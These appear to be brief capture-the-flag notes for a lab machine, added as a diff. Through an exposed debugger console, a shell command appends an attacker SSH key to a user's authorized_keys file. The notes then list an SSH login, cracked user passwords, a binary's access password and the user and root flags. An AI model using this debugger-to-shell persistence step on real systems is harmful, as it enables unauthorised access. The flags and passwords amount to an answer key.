@@ -1,0 +1,17 @@
+trigger debugger mode by browsing to /articles/a
+start console and import subprocess
+run
+print(subprocess.check_output("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXU2jlFJITLOwjg7SIXde9k65UX+TYPdEJHkywXcJ672cApt6N1J+/kfgTRkhOdDGNneZgrM2UlTZNIGoItpcE7cLuSFSQUn2+4+EgcM1H/H3GWCBOA3yT7sf+CWmBPTekTWYjZWqcpLep1WimsJBhQdfcSZGLljVVpvxFo81sTBbQSGhn8EgfsjO6HMuFghuDbt43jM8vuetVOs0Js2KRu9nNgEqer3ERy/Vnq9y4Imh1XXPT0NptnHvuluhohL06Xxrhc9xn2cg03NnvXn2TUDA6p/vhMCPSRov0SIdacOZnOB/p/rk9/CI0b2k3nfU64bn2akOf+JlTBLHDRbRl root@kali' >> /home/hal/.ssh/authorized_keys && echo 'done'",shell=True))
+
+ssh -i ./id_rsa hal@10.10.10.139 - password is wolfpack
+
+password123      (theplague)
+
+iamgod$08        (margo)
+
+user.txt:d0ff9e3f9da8bb00aaa6c0bb73e45903
+
+/usr/bin/garbage access password is N3veRF3@r1iSh3r3!
+root.txt:1cc73a448021ea81aee6c029a3d2f997
+
+
